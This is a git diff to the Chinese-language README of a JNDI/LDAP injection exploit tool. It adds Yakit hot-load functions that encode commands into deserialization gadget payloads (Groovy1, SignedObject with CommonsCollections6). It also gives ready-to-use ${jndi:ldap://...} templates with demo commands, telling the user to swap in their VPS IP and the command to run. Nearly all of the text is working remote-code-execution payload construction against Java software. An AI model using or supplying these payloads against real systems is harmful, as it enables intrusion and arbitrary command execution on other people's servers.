@@ -201,7 +201,7 @@ Supported LADP Queries：
 先于热加载标签中插入代码
 
 ```go
-jndiNu = func(Payload) {
+jndiNuSer = func(Payload) {
     Command := str.Split(Payload,"#")
     cmd := codec.EncodeBase64(Command[1])
     Payload := str.Replace(Command[0],"CommandNew",cmd,1)
@@ -211,7 +211,9 @@ jndiNu = func(Payload) {
 
 之后只需要改 GadgetType ，与Command即可
 
-```{{yak(jndiNu|${jndi:ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}```
+```
+{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}
+```
 
 ![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803130851.png)
 
@@ -283,6 +285,26 @@ ldap://0.0.0.0:1389/Deserialization/C3P04/Command/Base64/[base64_encoded_cmd]
 ```
 ldap://0.0.0.0:1389/Deserialization/SignedObject/Command/Base64/[base64_encoded_SignedObjectPayload]
 ```
+
+* 使用Yakit简化其Payload
+
+热加载中加入以下方法
+```go
+jndiNuSig = func(Payload) {
+    c        := str.Split(Payload,"#")
+    c1       := codec.EncodeBase64(c[2])
+    Payload  := str.Replace(c[1],"arg2",c1,1)
+    c2       := codec.EncodeBase64(Payload)
+    Payload1 := str.Replace(c[0],"arg1",c2,1)
+    return codec.EncodeUrl(Payload1)
+}
+```
+
+使用时只需要更改你的<VPS_IP>与要执行的命令即可
+```
+{{yak(jndiNuSig|${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/Command/Base64/arg1}#CC:CommonsCollections6:arg2:10000#open -a Calculator.app)}}
+```
+
 ---
 
 # 🏓TODO
